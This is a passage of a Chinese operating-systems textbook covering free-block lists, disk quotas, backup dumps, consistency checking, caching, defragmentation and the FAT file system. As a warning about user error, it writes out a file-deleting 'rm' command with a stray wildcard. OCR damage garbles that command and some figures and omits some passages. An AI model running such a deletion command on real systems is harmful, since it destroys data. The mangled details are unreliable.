在某些特定情形下，这个方法产生了不必要的磁盘I/O 。
考虑图4-23a中的情形，内存中的指针块只 有两个表项了。
如果释放了一个有三个磁盘块的文件，该指针块就溢出了，必须将其写入磁盘，这就产 生了图4-23b的情形。
如果现在写入含有三个块的文件，满的指针块不得不再次读入，这将回到图4-23a的 情形。
如果有三个块的文件只是作为临时文件被写入，当它被释放时，就需要另一个磁盘写操作，以便 把满的指针块写回磁盘。
总之，当指针块几乎为空时， 一系列短期的临时文件就会引起大量的磁盘I/O。
磁盘
a) b) c)
图4-23 a) 在内存中一个被指向空闲磁盘块的指针几乎充满的块，以及磁盘上三个指针块；b) 释放 一个 有三个块的文件的结果；c) 处理该三个块的文件的替代策略(带阴影的表项代表指向空闲磁盘 块的指针)
一个可以避免过多磁盘I/O 的替代策略是，拆分满了的指针块。
这样，当释放三个块时，不再是从 图4-23a变化到图4-23b, 而是从图4-23a变化到图4-23c。
现在，系统可以处理一系列临时文件，而不需 进行任何磁盘I/O 。
如果内存中指针块满了，就写入磁盘，半满的指针块从磁盘中读入。
这里的思想是： 保持磁盘上的大多数指针块为满的状态(减少磁盘的使用),但是在内存中保留一个半满的指针块。
这 样，它可以既处理文件的创建又同时处理文件的删除操作，而不会为空闲表进行磁盘I/O。
3.磁盘配额
为了防止人们贪心而占有太多的磁盘空间，多用户操作系统常常提供一种强制性磁盘配额机制。
其
思想是系统管理员分给每个用户拥有文 件和块的最大数量，操作系统确保每个 用户不超过分给他们的配额。
下面将介 绍一种典型的机制。
当用户打开一个文件时，系统找到 文件属性和磁盘地址，并把它们送入内 存中的打开文件表。
其中一个属性告诉 文件所有者是谁。
任何有关该文件大小 的增长都记到所有者的配额上，以防止 一个用户垄断所有i 节点。
第二张表包含了每个用户当前打开 文件的配额记录，即使是其他人打开该 文件也一样。
这张表如图4-24所示，该
配额表
软块限制
硬块限制
块的当前编号
剩余块数通知
软文件限制
硬文件限制
文件的当前编号
剩余文件数通知
图4-24 在配额表中记录了每个用户的配额
用户8的 配额
记录
表的内容是从被打开文件的所有者的磁盘配额文件中提取出来的。
当所有文件关闭时，该记录被写回配 额文件。
当用户试图登录时，系统核查配额文件，查看该用户文件数目或磁盘块数目是否超过软限制。
如果 超过了任一限制，则显示一个警告，保存的警告计数减1。
如果该计数已为0,表示用户多次忽略该警告， 因而将不允许该用户登录。
要想再得到登录的许可，就必须与系统管理员协商。
这一方法具有这样的性质，即只要用户在退出系统前消除所超过的部分，他们就可以在一次终端会 话期间超过其软限制，但无论什么情况下都不能超过硬限制。
4.4.2 文件系统备份
比起计算机的损坏，文件系统的破坏往往要糟糕得多。
如果由于火灾、闪电电流或者一杯咖啡泼在 键盘上而弄坏了计算机，确实让人伤透脑筋，而且又要花上一笔钱，但一般而言，更换非常方便。
只要 去计算机商店，便宜的个人计算机在短短一个小时之内就可以更换(当然，如果这发生在大学里面，则 发出订单需3个委员会的同意，5个签字要花90天的时间)。
许多人都认为不值得把时间和精力花在备份文件这件事上，直到某一天磁盘突然崩溃，他们才意识 到事态的严重性。
不过现在很多公司都意识到了数据的价值，常常把数据转到磁带上存储，并且每天至 少做一次这样的备份。
现在磁带的容量大至几十甚至几百GB, 而每个GB 仅仅需要几美分。
其实，做备 份并不像人们说得那么烦琐，现在就来看一下相关的要点。
做磁带备份主要是要处理好两个潜在问题中的一个：
1)从意外的灾难中恢复。
2)从错误的操作中恢复。
第一个问题主要是由磁盘破裂、火灾、洪水等自然灾害引起的。
事实上这些情形并不多见，所以许 多人也就不以为然。
这些人往往也是以同样的原因忽略了自家的火灾保险。
第二个原因主要是用户意外地删除了原本还需要的文件。
这种情况发生得很频繁，使得Windows 的 设计者们针对“删除”命令专门设计了特殊目录——回 收 站 ，也就是说，在人们删除文件的时候，文件 本身并不真正从磁盘上消失，而是被放置到这个特殊目录下，待以后需要的时候可以还原回去。
文件备 份更主要是指这种情况，这就允许几天之前，甚至几个星期之前的文件都能从原来备份的磁带上还原。
为文件做备份既耗时间又费空间，所以需要做得又快又好，这一点很重要。
基于上述考虑我们来看 看下面的问题。
首先，是要备份整个文件系统还是仅备份一部分呢?
在许多安装配置中，可执行程序 (二进制代码)放置在文件系统树的某个限定部分，所以如果这些文件能直接从厂商提供的网站或安装 DVD上重新安装的话，也就没有必要为它们做备份。
此外，多数系统都有专门的临时文件目录，这个目 录也不需要备份。
在UNIX 系统中，所有的特殊文件(也就是I/O 设备)都放置在/dev目录下，对这个目 录做备份不仅没有必要而且还十分危险——因为一旦进行备份的程序试图读取其中的文件，备份程序就 会永久挂起。
简而言之，合理的做法是只备份特定目录及其下的全部文件，而不是备份整个文件系统。
其次，对前一次备份以来没有更改过的文件再做备份是一种浪费，因而产生了增量转储的思想。
最 简单的增量转储形式就是周期性地(每周一次或每月一次)做全面的转储(备份),而每天只对从上一 次全面转储起发生变化的数据做备份。
稍微好一点的做法只备份自最近一次转储以来更改过的文件。
当 然了，这种做法极大地缩减了转储时间，但恢复起来却更复杂，因为最近的全面转储先要全部恢复，随 后按逆序进行增量转储。
为了方便恢复，人们往往使用更复杂的增量转储模式。
第三，既然待转储的往往是海量数据，那么在将其写入磁带之前对文件进行压缩就很有必要。
可是
对许多压缩算法而言，备份磁带上的单个坏点就能破坏解压缩算法，并导致整个文件甚至整个磁带无法 读取。
所以是否要对备份文件流进行压缩必须慎重考虑。
第五，即最后一个问题，做备份会给一个单位引入许多非技术性问题。
如果当系统管理员下楼去取 咖啡，而毫无防备地把备份磁盘或磁带搁置在办公室里的时候，就是世界上最棒的在线保安系统也会失 去作用。
这时， 一个间谍所要做的只是潜入办公室、将一个小磁盘或磁带放入口袋，然后绅士般地离开。
再见吧保安系统。
即使每天都做备份，如果碰上一场大火烧光了计算机和所有的备份磁盘，那做备份又 有什么意义呢?
由于这个原因，所以备份磁盘应该远离现场存放，不过这又带来了更多的安全风险(因 为，现在必须保护两个地点了)。
关于此问题和管理中的其他实际问题，请参考Nemeth 等人(2013)。
接下来我们只讨论文件系统备份所涉及的技术问题。
磁盘转储到磁带上有两种方案：物理转储和逻辑转储。
物理转储是从磁盘的第0块开始，将全部的 磁盘块按序输出到磁带上，直到最后一块复制完毕。
此程序很简单，可以确保万无一失，这是其他任何 实用程序所不能比的。
不过有几点关于物理转储的评价还是值得一提的。
首先，未使用的磁盘块无须备份。
如果转储程序 能够访问空闲块的数据结构，就可以避免该程序备份未使用的磁盘块。
但是，既然磁带上的第k块并不 代表磁盘上的第k块，那么要想略过未使用的磁盘块就需要在每个磁盘块前边写下该磁盘块的号码(或 其他等效数据)。
第二个需要关注的是坏块的转储。
制造大型磁盘而没有任何瑕疵几乎是不可能的，总是有一些坏块 存在。
有时进行低级格式化后，坏块会被检测出来，标记为坏的，并被应对这种紧急状况的在每个轨道 末端的一些空闲块所替换。
在很多情况下，磁盘控制器处理坏块的替换过程是透明的，甚至操作系统也 不知道。
然而，有时格式化后块也会变坏，在这种情况下操作系统可以检测到它们。
通常，可以通过建立一 个包含所有坏块的“文件”来解决这个问题——只要确保它们不会出现在空闲块池中并且绝不会被分配。
不用说，这个文件是完全不能够读取的。
如果磁盘控制器将所有坏块重新映射，并对操作系统隐藏的话，物理转储工作还是能够顺利进行的。
另一方面，如果这些坏块对操作系统可见并映射到一个或几个坏块文件或者位图中，那么在转储过程中， 物理转储程序绝对有必要能访问这些信息，并避免转储之，从而防止在对坏块文件备份时的无止境磁盘 读错误发生。
Windows 系统有分页文件和休眠文件。
它们在文件还原时不发挥作用，同时也不应在第一时间进行 备份。
特定的系统可能也有其他不需要备份的文件，在销毁程序中需要注意它们。
物理转储的主要优点是简单、极为快速(基本上是以磁盘的速度运行)。
主要缺点是，既不能跳过选 定的目录，也无法增量转储，还不能满足恢复个人文件的请求。
正因如此，绝大多数配置都使用逻辑转储。
逻辑转储从一个或几个指定的目录开始，递归地转储其自给定基准日期(例如，最近一次增量转储 或全面系统转储的日期)后有所更改的全部文件和目录。
所以，在逻辑转储中，转储磁带上会有一连串 精心标识的目录和文件，这样就很容易满足恢复特定文件或目录的请求。
既然逻辑转储是最为普遍的形式，就让我们以图4-25为例来仔细研究一个通用算法。
该算法在 UNIX 系统上广为使用。
在图中可以看到一棵由目录(方框)和文件(圆圈)组成的文件树。
被阴影覆 盖的项目代表自基准日期以来修改过，因此需要转储，无阴影的则不需要转储。
该算法还转储通向修改过的文件或目录的路径上的所有目录(甚至包括未修改的目录),原因有二。
其一是为了将这些转储的文件和目录恢复到另一台计算机的新文件系统中。
这样，转储程序和恢复程序 就可以在计算机之间进行文件系统的整体转移。
图4-25 待转储的文件系统，其中方框代表目录，圆圈代表文件。
被阴影覆盖的项目表示自上次转储以 来修改过。
每个目录和文件都被标上其i节点号
转储被修改文件之上的未修改目录的第二个原因是为了可以对单个文件进行增量恢复(很可能是对 愚蠢操作而损坏的文件的恢复)。
设想如果星期天晚上转储了整个文件系统，星期一晚上又做了一次增 量转储。
在星期二，/usr/jhs/proj/nr3 目录及其下的全部目录和文件被删除了。
星期三 一 大早用户又想恢 复/usr/jhs/proj/nr3/plans/summary 文件。
但因为没有设置，所以不可能单独恢复summary 文件。
必须首先
恢复nr3和plans这两个目录。
为了正确获取文件的所有者、模式、时间等各种信息，这些目录当然必须 再次备份到转储磁带上，尽管自上次完整转储以来它们并没有修改过。
逻辑转储算法要维持一个以i节点号为索引的位图，每个i节点包含了几位。
随着算法的执行，位图 中的这些位会被设置或清除。
算法的执行分为四个阶段。
第一阶段从起始目录(本例中为根目录)开始 检查其中的所有目录项。
对每一个修改过的文件，该算法将在位图中标记其i节点。
算法还标记并递归 检查每 一个目录(不管是否修改过)。
第一阶段结束时，所有修改过的文件和全部目录都在位图中标记了，如图4-26a所示(以阴影标记)。
理论上说来，第二阶段再次递归地遍历目录树，并去掉目录树中任何不包含被修改过的文件或目录的目 录上的标记。
本阶段的执行结果如图4-26b所示。
注意，i 节点号为10、11、14、27、29和30的目录此时 已经被去掉标记，因为它们所包含的内容没有做任何修改。
它们也不会被转储。
相反，i 节点号为5和6 的目录其本身尽管没有被修改过也要被转储，因为在新的机器上恢复当日的修改时需要这些信息。
为了 提高算法效率，可以将这两阶段的目录树遍历合二为一。
a) b) c) d)
图4-26 逻辑转储算法所使用的位图
现在哪些目录和文件必须被转储已经很明确了，就是图4-26b中所标记的部分。
第三阶段算法将以 节点号为序，扫描这些i节点并转储所有标记为需转储的目录，如图4-26c所示。
为了进行恢复，每个被 转储的目录都用目录的属性(所有者、时间等)作为前缀。
最后，在第四阶段，在图4-26d中被标记的 文件也被转储，同样，由其文件属性作为前缀。
至此，转储结束。
从转储磁带上恢复文件系统很容易办到。
首先要在磁盘上创建一个空的文件系统，然后恢复最近一 次的完整转储。
由于磁带上最先出现目录，所以首先恢复目录，给出文件系统的框架；然后恢复文件本 身。
在完整转储之后的是完整转储的第一次增量转储，然后是第二次，重复这一过程，以此类推。
尽管逻辑转储十分简单，还是有几点棘手之处。
首先，既然空闲块列表并不是一个文件，那么在所 有被转储的文件恢复完毕之后，就需要从零开始重新构造。
这一点可以办到，因为全部空闲块的集合恰 好是包含在全部文件中的块集合的补集。
另一个问题是关于链接。
如果一个文件被链接到两个或多个目录中，要注意在恢复时只对该文件恢 复一次，然后所有指向该文件的目录重新指向该文件。
还有一个问题就是：UNIX 文件实际上包含了许多“空洞”。
打开文件，写几个字节，然后找到文件 中一个偏移了一定距离的地址，又写入更多的字节，这么做是合法的。
但两者之间的这些块并不属于文 件本身，从而也不应该在其上实施转储和恢复操作。
核心文件通常在数据段和堆栈段之间有一个数百兆 字节的空洞。
如果处理不得当，每个被恢复的核心文件会以“0”填充这些区域，这可能导致该文件与 虚拟地址空间一样大(例如，2³²字节，更糟糕的可能会达到2⁶⁴字节)。
最后，无论属于哪一个目录(它们并不一定局限于/dev目录下),特殊文件、命名管道以及类似的文 件都不应该转储。
关于文件系统备份的更多信息，请参考 (Chervenak 等人，1998;Zwicky,1991)。
4.4.3 文件系统的一致性
影响文件系统可靠性的另一个问题是文件系统的一致性。
很多文件系统读取磁盘块，进行修改后， 再写回磁盘。
如果在修改过的磁盘块全部写回之前系统崩溃，则文件系统有可能处于不一致状态。
如果 一些未被写回的块是i节点块、目录块或者是包含有空闲表的块时，这个问题尤为严重。
为了解决文件系统的不一致问题，很多计算机都带有一个实用程序以检验文件系统的一致性。
例如， UNIX有fsck, 而Windows用scandisk。
系统启动时，特别是崩溃之后的重新启动，可以运行该实用程序。
下面我们介绍在UNIX中这个fsck 实用程序是怎样工作的。
scandisk 有所不同，因为它工作在另一种文件 系统上，不过运用文件系统的内在冗余进行修复的一般原理仍然有效。
所有文件系统检验程序可以独立 地检验每个文件系统(磁盘分区)的一致性。
一致性检查分为两种：块的一致性检查和文件的一致性检查。
在检查块的一致性时，程序构造两张 表，每张表中为每个块设立一个计数器，都初始化为0。
第一个表中的计数器跟踪该块在文件中的出现 次数，第二个表中的计数器跟踪该块在空闲表或空闲位图中的出现次数。
有可能出现的另一种情况如图4-27c所示。
其中，块4在空闲表中出现了2次(只在空闲表是真正意 义上的一张表时，才会出现重复，在位图中，不会发生这类情况)。
解决方法也很简单：只要重新建立 空闲表即可。
文件系统检验程序可以采取相应的处理方法是，先分配一空闲块，把块5中的内容复制到空闲块中， 然后把它插到其中一个文件之中。
这样文件的内容未改变(虽然这些内容几乎可以肯定是不对的),但 至少保持了文件系统的一致性。
这一错误应该报告，由用户检查文件受损情况。
块号
01 2 34 5 6 78 9101112131415
c)
块号
01234 567 89101112131415
d)
图4-27 文件系统状态：a) 一 致 ；b)块丢失； c)空闲表中有重复块； d)重复数据块
如果i节点的链接计数大于目录项个数，这时即使所有的文件都从目录中删除，这个计数仍是非0,i 节点不会被删除。
该错误并不严重，却因为存在不属于任何目录的文件而浪费了磁盘空间。
为改正这一 错误，可以把i 节点中的链接计数设成正确值。
另一种错误则是潜在的灾难。
如果同一个文件链接两个目录项，但其i 节点链接计数只为1,如果删 除了任何一个目录项，对应节点链接计数变为0。
当i节点计数为0时，文件系统标志该i节点为“未使用”, 并释放其全部块。
这会导致其中一个目录指向一未使用的i节点，而很有可能其块马上就被分配给其他 文件。
解决方法同样是把节点中链接计数设为目录项的实际个数值。
由于效率上的考虑，以上的块检查和目录检查经常被集成到一起(即仅对i节点扫描一遍)。
当然也 有一些其他检查方法。
例如，目录是有明确格式的，包含有i 节点数目和ASCII 文件名，如果某个目录的i 节点编号大于磁盘中节点的实际数目，说明这个目录被破坏了。
再有，每个i 节点都有一个访问权限项。
一些访问权限是合法的，但是很怪异，比如0007,它不允 许文件所有者及所在用户组的成员进行访问，而其他的用户却可以读、写、执行此文件。
在这类情况下， 有必要报告系统已经设置了其他用户权限高于文件所有者权限这一情况。
拥有1000多个目录项的目录也 很可疑。
为超级用户所拥有，但放在用户目录下，且设置了SETUID 位的文件，可能也有安全问题，因 为任何用户执行这类文件都需要超级用户的权限。
可以轻松地列出一长串特殊的情况，尽管这些情况合 法，但报告却是有必要的。
以上讨论了防止因系统崩溃而破坏用户文件的问题，某一些文件系统也防止用户自身的误操作。
如 果用户想输入
rm*.0
删除全部以.o结尾的文件(编译器生成的目标文件),但不幸键入了 rm*.0
(注意，星号后面有一空格),则rm 命令会删除全部当前目录中的文件，然后报告说找不到文件.0。
在 Windows中，删除的文件被转移到回收站目录中(一个特别的目录),稍后若需要，可以从那里还原文 件。
当然，除非文件确实从回收站目录中删除，否则不会释放空间。
4.4.4 文件系统性能
1.高速缓存
最常用的减少磁盘访问次数技术是块高速缓存 (block cache) 或者缓冲区高速缓存 (buffer cache)。
在 本书中，高速缓存指的是一系列的块，它们在逻辑上属于磁盘，但实际上基于性能的考虑被保存在内存中。
管理高速缓存有不同的算法，常用的算法是：检查全部的读请求，查看在高速缓存中是否有所需要 的块。
如果存在，可执行读操作而无须访问磁盘。
如果该块不在高速缓存中，首先要把它读到高速缓存， 再复制到所需地方。
之后，对同一个块的请求都通过高速缓存完成。
高速缓存的操作如图4-28所示。
由于在 高速缓存中有许多块(通常有上千块),所 以需要有某种方法快速确定所需要的块是否 存在。
常用方法是将设备和磁盘地址进行散 列操作，然后，在散列表中查找结果。
具有 相同散列值的块在一个链表中连接在一起， 这样就可以沿着冲突链查找其他块。
如果高速缓存已满，此时需要调入新的
块，则要把原来的某一块调出高速缓存(如果要调出的块在上次调入以后修改过，则要把它写回磁盘)。
这种情况与分页非常相似，所有常用的页面置换算法在第3章中已经介绍，例如FIFO 算法、第二次机会 算法、LRU 算法等，它们都适用于高速缓存。
与分页相比，高速缓存的好处在于对高速缓存的引用不很 频繁，所以按精确的LRU 顺序在链表中记录全部的块是可行的。
在图4-28中可以看到，除了散列表中的冲突链之外，还有一个双向链表把所有的块按照使用时间的 先后次序链接起来，近来使用最少的块在该链表的前端，而近来使用最多的块在该链表的后端。
当引用 某个块时，该块可以从双向链表中移走，并放置到该表的尾部去。
用这种方法，可以维护一种准确的 LRU顺序。
但是，这又带来了意想不到的难题。
现在存在一种情形，使我们有可能获得精确的LRU, 但是碰巧 该LRU却又不符合要求。
这个问题与前一节讨论的系统崩溃和文件一致性有关。
如果一个关键块(比如 i 节点块)读进了高速缓存并做过修改，但是没有写回磁盘，这时，系统崩溃会导致文件系统的不一致。
如果把i 节点块放在LRU链的尾部，在它到达链首并写回磁盘前，有可能需要相当长的一段时间。
此外，某一些块，如节点块，极少可能在短时间内被引用两次。
基于这些考虑需要修改LRU方案， 并应注意如下两点：
1)这一块是否不久后会再次使用?
2)这一块是否与文件系统一致性有本质的联系?
考虑以上两个问题时，可将块分为i 节点块、间接块、目录块、满数据块、部分数据块等几类。
把 有可能最近不再需要的块放在LRU链表的前部，而不是LRU链表的后端，于是它们所占用的缓冲区可以 很快被重用。
对很快就可能再次使用的块，比如正在写入的部分满数据块，可放在链表的尾部，这样它 们能在高速缓存中保存较长的一段时间。
第二个问题独立于前一个问题。
如果关系到文件系统一致性(除数据块之外，其他块基本上都是这 样)的某块被修改，都应立即将该块写回磁盘，不管它是否被放在LRU 链表尾部。
将关键块快速写回磁 盘，将大大减少在计算机崩溃后文件系统被破坏的可能性。
用户的文件崩溃了，该用户会不高兴，但是 如果整个文件系统都丢失了，那么这个用户会更生气。
尽管用这类方法可以保证文件系统一致性不受到破坏，但我们仍然不希望数据块在高速缓存中放很 久之后才写入磁盘。
设想某人正在用个人计算机编写一本书。
尽管作者让编辑程序将正在编辑的文件定
期写回磁盘，所有的内容只存在高速缓存中而不在磁盘上的可能性仍然非常大。
如果这时系统崩溃，文 件系统的结构并不会被破坏，但他一整天的工作就会丢失。
即使只发生几次这类情况，也会让人感到不愉快。
系统采用两种方法解决这一问题。
在UNIX系统 中有一个系统调用sync, 它强制性地把全部修改过的块立即写回磁盘。
系统启动时，在后台运行一个通 常名为update的程序，它在无限循环中不断执行sync 调用，每两次调用之间休眠30s。
于是，系统即使 崩溃，也不会丢失超过30秒的工作。
虽然目前Windows 有一个等价于sync 的系统调用——FlushFileBuffer s, 不过过去没有。
相反， Windows 采用一个在某种程度上比UNIX 方式更好(某种程度更坏)的策略。
其做法是，只要被写入高 速缓存，就把每个被修改的块写回磁盘。
将高速缓存中所有被修改的块立即写回磁盘称为通写高速缓存 (write-through cache)。
与非通写高速缓存相比，通写高速缓存需要更多的磁盘I/O。
若某程序要写满1KB的块，每次写一个字符，这时可以看到这两种方法的区别。
UNIX 在高速缓存 中保存全部字符，并且每30秒把该块写回磁盘一次，或者当从高速缓存删除这一块时，将该块写回磁盘。
在通写高速缓存里，每写入一字符就要访问一次磁盘。
当然，多数程序有内部缓冲，通常情况下，在每 次执行write系统调用时并不是只写入一个字符，而是写入一行或更大的单位。
采用这两种不同的高速缓存策略的结果是：在UNIX系统中，若不调用sync 就移动磁盘，往往会导 致数据丢失，在被毁坏的文件系统中也经常如此。
而在通写高速缓存中，就不会出现这类情况。
选择不 同策略的原因是，在UNIX 开发环境中，全部磁盘都是硬盘，不可移动。
而第一代Windows 文件源自 MS-DOS, 是从软盘世界中发展起来的。
由于UNIX 方案有更高的效率它成为当然的选择(但可靠性更 差),随着硬盘成为标准，它目前也用在Windows的磁盘上。
但是，NTFS 使用其他方法(日志)改善其 可靠性，这在前面已经讨论过。
一些操作系统将高速缓存与页缓存集成，这种方式在支持内存映射文件的时候特别吸引人。
如果一 个文件被映射到内存上，则它其中的一些页就会在内存中，因为它们被要求按页进入。
这些页面与在高 速缓存中的文件块几乎没有不同。
在这种情况下，它们能被以同样的方式来对待，也就是说，用一个缓 存来同时存储文件块与页。
2.块提前读
第二个明显提高文件系统性能的技术是：在需要用到块之前，试图提前将其写入高速缓存，从而提 高命中率。
特别地，许多文件都是顺序读的。
如果请求文件系统在某个文件中生成块k, 文件系统执行 相关操作且在完成之后，会在用户不察觉的情形下检查高速缓存，以便确定块k+1是否已经在高速缓存。
如果还不在，文件系统会为块k+1安排一个预读，因为文件系统希望在需要用到该块时，它已经在高速 缓存或者至少马上就要在高速缓存中了。
当然，块提前读策略只适用于实际顺序读取的文件。
对随机访问文件，提前读丝毫不起作用。
相反， 它还会帮倒忙，因为读取无用的块以及从高速缓存中删除潜在有用的块将会占用固定的磁盘带宽(如果 有“脏”块的话，还需要将它们写回磁盘，这就占用了更多的磁盘带宽)。
那么提前读策略是否值得采 用呢?
文件系统通过跟踪每一个打开文件的访问方式来确定这一点。
例如，可以使用与文件相关联的某 个位协助跟踪该文件到底是“顺序访问方式”还是“随机访问方式”。
在最初不能确定文件属于哪种存 取方式时，先将该位设置成顺序访问方式。
但是，查找一完成，就将该位清除。
如果再次发生顺序读取， 就再次设置该位。
这样，文件系统可以通过合理的猜测，确定是否应该采取提前读的策略。
即便弄错了 一次也不会产生严重后果，不过是浪费一小段磁盘的带宽罢了。
3.减少磁盘臂运动
高速缓存和块提前读并不是提高文件系统性能的唯一方法。
另一种重要技术是把有可能顺序访问的 块放在一起，当然最好是在同一个柱面上，从而减少磁盘臂的移动次数。
当写一个输出文件时，文件系 统就必须按照要求一次一次地分配磁盘块。
如果用位图来记录空闲块，并且整个位图在内存中，那么选 择与前一块最近的空闲块是很容易的。
如果用空闲表，并且链表的一部分存在磁盘上，要分配紧邻着的 空闲块就困难得多。
不过，即使采用空闲表，也可以采用块簇技术。
这里用到一个小技巧，即不用块而用连续块簇来跟 踪磁盘存储区。
如果一个扇区有512个字节，有可能系统采用1KB的块(2个扇区),但却按每2块(4个
178 第 4 章
扇区)一个单位来分配磁盘存储区。
这和2KB的磁盘块并不相同，因为在高速缓存中它依然使用1KB的 块，磁盘与内存数据之间传送也是以1KB 为单位进行，但在一个空闲的系统上顺序读取文件，寻道的次 数可以减少一半，从而使文件系统的性能大大改善。
若考虑旋转定位则可以得到这类方案的变体。
在分 配块时，系统尽量把一个文件中的连续块存放在同一柱面上。
在使用i节点或任何类似节点的系统中，另一个性能瓶颈是，读取一个很短的文件也需要两次磁盘 访问： 一次是访问i节点，另一次是访问块。
通常情况下，i节点的放置如图4-29a所示。
其中，全部i节点 都放在靠近磁盘开始位置，所以i节点和它指向的块之间的平均距离是柱面数的一半，这将需要较长的 寻道时间。
i 节点位于靠近 磁盘开始位置
a)
磁盘被划分为柱面组， 每组有自己的节点
b)
图4-29 a)i 节点放在磁盘开始位置； b) 磁盘分为柱面组，每组有自己的块和i节点
一个简单的改进方法是，在磁盘中部而不是开始处存放节点，此时，在i节点和第一块之间的平均 寻道时间减为原来的一半。
另一种做法是：将磁盘分成多个柱面组，每个柱面组有自己的i节点、数据块 和空闲表 (McKusick 等人，1984),见图4-29b。
在文件创建时，可选取任一i 节点，但选定之后，首先 在该i 节点所在的柱面组上查找块。
如果在该柱面组中没有空闲的块，就选用与之相邻的柱面组的一个块。
当然，仅当磁盘中装有磁盘臂的时候，讨论寻道时间和旋转时间才是有意义的。
越来越多的电脑开 始装配不带移动部件的固态硬盘 (SSD) 。
对于这些硬盘，由于采用了和闪存同样的制造技术，使得随 机访问与顺序访问在传输速度上已经较为相近，传统硬盘的许多问题就消失了。
不幸的是，新的问题又 随之出现。
例如，固态硬盘在读取、写入和删除时表现出一些特性，尤其是每一块只可写入有限次数的特征， 导致使用时需要十分小心以达到均匀分散磨损的目的。
4.4.5 磁盘碎片整理
在初始安装操作系统后，从磁盘的开始位置， 一个接一个地连续安装了程序与文件。
所有的空闲磁 盘空间放在一个单独的、与被安装的文件邻近的单元里。
但随着时间的流逝，文件被不断地创建与删除， 于是磁盘会产生很多碎片，文件与空穴到处都是。
结果是，当创建一个新文件时，它使用的块会散布在 整个磁盘上，造成性能的降低。
磁盘性能可以通过如下方式恢复：移动文件使它们相邻，并把所有的(至少是大部分的)空闲空间 放在一个或多个大的连续的区域内。
Windows 有一个程序defrag 就是从事这个工作的。
Windows 的用户 应该定期使用它，当然，SSD 盘除外。
磁盘碎片整理程序会在一个在分区末端的连续区域内有大量空闲空间的文件系统上很好地运行。
这 段空间会允许磁盘碎片整理程序选择在分区开始端的碎片文件，并复制它们所有的块放到空闲空间内。
这个动作在磁盘开始处释放出一个连续的块空间，这样原始或其他的文件可以在其中相邻地存放。
这个 过程可以在下一大块的磁盘空间上重复，并继续下去。
有些文件不能被移动，包括页文件、休眠文件以及日志，因为移动这些文件所需的管理成本要大于 移动它们所获得的收益。
在一些系统中，这些文件是固定大小的连续的区域，因此它们不需要进行碎片 整理。
这类文件缺乏灵活性会造成一些问题， 一种情况是，它们恰好在分区的末端附近并且用户想减小
分区的大小。
解决这种问题的唯一的方法是把它们一起删除，改变分区的大小，然后再重新建立它们。
Linux 文件系统(特别是ext2和ext3) 由于其选择磁盘块的方式，在磁盘碎片整理上一般不会遭受像 Windows那样的困难，因此很少需要手动的磁盘碎片整理。
而且，固态硬盘并不受磁盘碎片的影响。
事 实上，在固态硬盘上做磁盘碎片整理反倒是多此一举，不仅没有提高性能，反而磨损了固态硬盘。
所以 碎片整理只会缩短固态硬盘的寿命。
4.5 文件系统实例
在这一节，我们将讨论文件系统的几个实例，包括从相对简单的文件系统到十分复杂的文件系统。
现代流行的UNIX文件系统和Windows 8自带文件系统在本书的第10章和第11章有详细介绍，在此就不再 讨论了。
但是我们有必要来看看这些文件系统的前身。
4.5.1 MS-DOS文件系统
要读文件时，MS-DOS 程序首先要调用open 系统调用，以获得文件的句柄。
open 系统调用识别一 个路径，可以是绝对路径或者是相对于现在工作目录的路径。
路径是一个分量一个分量地查找的，直到 查到最终的目录并读进内存。
然后开始搜索要打开的文件。
尽管MS-DOS的目录是可变大小的，但它使用固定的32字节的目录项，MS-DOS 的目录项的格式如 图4-30所示。
它包含文件名、属性、建立日期和时间、起始块和具体的文件大小。
在每个分开的域中， 少于8+3个字符的文件名左对齐，在右边补空格。
属性域是一个新的域，包含用来指示一个文件是只读 的、存档的、隐藏的还是一个系统文件的位。
不能写只读文件，这样避免了文件意外受损。
存档位没有 对应的操作系统的功能(即MS-DOS 不检查和设置它)。
存档位主要的用途是使用户级别的存档程序在 存档一个文件后清理这一位，其他程序在修改了这个文件之后设置这一位。
以这种方式，一个备份程序 可以检查每个文件的这一位来确定是否需要备份该文件。
设置隐藏位能够使一个文件在目录列表中不出 现，其作用是避免初级用户被一些不熟悉的文件搞糊涂了。
最后，系统位也隐藏文件。
另外，系统文件 不可以用del 命令删除，在MS-DOS的主要组成部分中，系统位都被设置。
图4-30 MS-DOS 的目录项
目录项也包含了文件建立和最后修改的日期和时间。
时间只是精确到±2s, 因为它只是用2个字节 的域来存储，只能存储65536个不同的值(一天包含86400秒)。
这个时间域被分为秒(5个位)、分(6 个位)和小时(5个位)。
以日为单位计算的日期使用三个子域：日(5个位),月(4个位),年-1980(7 个位)。
用7个位的数字表示年，时间的起始为1980年，最高的表示年份是2107年。
所以MS-DOS有内在 的2108年问题。
为了避免灾难，MS-DOS 的用户应该尽快开始在2108年之前转变工作。
如果把MS-DOS 使用组合的日期和时间域作为32位的秒计数器，它就能准确到秒，可把灾难推迟到2116年。
MS-DOS按32位的数字存储文件的大小，所以理论上文件大小能够大至4GB。
尽管如此，其他的约 束(下面论述)将最大文件限制在2GB或者更小。
让人吃惊的是目录项中的很大一部分空间(10字节)
没有使用。
MS-DOS通过内存里的文件分配表来跟踪文件块。
目录表项包含了第一个文件块的编号，这个编号用 作内存里有64K 个目录项的FAT的索引。
沿着这条链，所有的块都能找到。
FAT 的操作在图4-12中有描述。
FAT 文件系统总共有FAT-12、FAT-16 和FAT-32三个版本，这取决于磁盘地址包含有多少二进制位。
其 实 ，FAT-32 只用到了地址空间中的低28位，它更应该叫FAT-28。
但使用2的幂的这种表述听起来要匀 整得多。
FAT文件系统的另外一个变种是exFAT, 它是微软为大型可移动设备设计的。
苹果公司获得了 exFAT的授权，所以exFAT是一个既可以在Windows 又可以在OS X上用于传输文件的现代文件系统。
由 于exFAT是一项专利，并且微软没有发布其说明书，因此就不在这里进一步讨论了。
在所有的FAT中，都可以把磁盘块大小调整到512字节的倍数(不同的分区可能采用不同的倍数), 合法的块大小(微软称之为簇大小)在不同的FAT中也会有所不同。
第一版的MS-DOS使用块大小为512 字节的FAT-12, 分区大小最大为21²×512字节(实际上只有4086×512字节，因为有10个磁盘地址被用 作特殊的标记，如文件的结尾、坏块等)。
根据这些参数，最大的磁盘分区大小约为2MB, 而内存里的 FAT表中有4096个项，每项2字节(16位)。
若使用12位的目录项则会非常慢。
这个系统在软盘条件下工作得很好，但当硬盘出现时，它就出现问题了。
微软通过允许其他的块大 小 如 ( 1KB,2KB,4KB) 来解决这个问题。
这个修改保留了FAT-12表的结构和大小，但是允许可达16 MB的磁盘分区。
由于MS-DOS 支持在每个磁盘驱动器中划分四个磁盘分区，所以新的FAT-12 文件系统可在最大 64MB 的磁盘上工作。
除此之外，还必须引入新的内容。
